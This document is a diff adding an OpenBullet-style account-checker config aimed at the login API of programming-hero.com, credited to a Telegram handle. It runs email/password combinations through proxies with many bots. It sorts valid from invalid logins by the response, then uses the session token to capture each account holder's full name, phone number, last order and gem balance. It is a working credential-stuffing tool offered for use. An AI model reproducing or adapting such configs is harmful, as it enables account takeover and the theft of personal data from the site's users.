@@ -1,0 +1,131 @@
+[SETTINGS]
+{
+  "Name": "programming-hero",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-24T10:23:33.4646652+02:00",
+  "AdditionalInfo": "https://t.me/Koko_Nader",
+  "Author": "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://web.programming-hero.com/api/user/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"platform\":\"Windows 10\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Host: web.programming-hero.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 85" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "Authorization: undefined" 
+  HEADER "Content-Type: application/json;charset=UTF-8" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://web.programming-hero.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://web.programming-hero.com/login" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+    KEY "{\"success\":true,\"token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "404" 
+    KEY "<RESPONSECODE>" Contains "401" 
+    KEY "{\"success\":false,\"msg\":\"Could not find user\"}" 
+    KEY "{\"success\":false,\"msg\":\"You entered the wrong password\"}" 
+
+#token PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+REQUEST GET "https://web.programming-hero.com/api/user/me" 
+  
+  HEADER "Host: web.programming-hero.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "Authorization: <token>" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Accept: */*" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://web.programming-hero.com/login" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#fullName PARSE "<SOURCE>" JSON "fullName" CreateEmpty=FALSE -> CAP "fullName" 
+
+#phone PARSE "<SOURCE>" JSON "phone" CreateEmpty=FALSE -> CAP "phone" 
+
+#lastOrdered PARSE "<SOURCE>" JSON "lastOrdered" CreateEmpty=FALSE -> CAP "lastOrdered" 
+
+REQUEST GET "https://web.programming-hero.com/api/gem/user-gem/" 
+  
+  HEADER "Host: web.programming-hero.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "Authorization: <token>" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Accept: */*" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://web.programming-hero.com/login" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#totalGem PARSE "<SOURCE>" JSON "totalGem" CreateEmpty=FALSE -> CAP "totalGem" 
+
+#usedGem PARSE "<SOURCE>" JSON "usedGem" CreateEmpty=FALSE -> CAP "usedGem" 
+
+#BY FUNCTION Constant "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader" -> CAP "Checkeed By" 
+
